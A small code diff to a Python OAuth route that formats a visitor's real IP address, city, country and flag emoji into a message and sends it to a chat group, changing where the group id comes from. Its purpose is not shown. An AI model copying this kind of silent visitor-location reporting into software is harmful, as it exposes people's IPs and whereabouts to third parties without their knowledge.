@@ -61,7 +61,7 @@ def oauth():
         country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
         message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
-        send_message(group['group_id'], message)
+        send_message(session["group_id"], message)
 
         client_id = session["client_id"]
         domain = config["DOMAIN"]
